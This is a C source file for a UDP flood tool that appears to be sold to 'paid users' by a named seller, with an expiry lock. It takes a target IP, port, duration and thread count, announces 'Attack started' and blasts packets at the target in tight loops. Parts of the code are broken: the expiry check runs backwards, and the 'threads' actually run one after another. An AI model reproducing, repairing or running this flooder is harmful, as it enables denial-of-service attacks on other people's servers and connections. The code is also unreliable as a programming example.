#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define BUFFER_SIZE 900
#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 1

char *ip;
int port;
int duration;
int threads;
int stopFlag = 0;

void checkExpiration() {
    struct tm expirationDate = {0};
    expirationDate.tm_year = EXPIRATION_YEAR - 1900;
    expirationDate.tm_mon = EXPIRATION_MONTH - 1;
    expirationDate.tm_mday = EXPIRATION_DAY;
    time_t currentTime = time(NULL);
    if (difftime(currentTime, mktime(&expirationDate)) < 0) {
        fprintf(stderr, "This file is closed by @Roxz_gaming.\n");
        exit(1);
    }
}

void sendUDPTraffic(int userID) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "User %d: Failed to create socket\n", userID);
        return;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    char buffer[BUFFER_SIZE] = "UDP traffic test";
    time_t endTime = time(NULL) + duration;

    while (time(NULL) < endTime) {
        if (stopFlag) {
            break;
        }

        // Batch send packets
        for (int i = 0; i < 10; i++) { // You can experiment with this number
            int bytesSent = sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
            if (bytesSent < 0) {
                fprintf(stderr, "User %d: Send failed\n", userID);
            }
        }
    }

    close(sockfd);
}

void expirationCheckThread() {
    while (1) {
        if (stopFlag) {
            break;
        }
        checkExpiration();
        sleep(3600); // 1 hour in seconds
    }
}

void signalHandler(int signal) {
    stopFlag = 1;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(1);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    threads = atoi(argv[4]);

    checkExpiration();

    // Print attack parameters
    printf("Attack started\n");
    printf("IP: %s\n", ip);
    printf("PORT: %d\n", port);
    printf("TIME: %d seconds\n", duration);
    printf("THREADS: %d\n", threads);
    printf("File is made by @Roxz_gaming only for paid users.\n");

    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    // Create threads
    for (int i = 0; i < threads; i++) {
        sendUDPTraffic(i);
    }

    // Wait for threads to finish (if necessary)
    // ...

    return 0;
}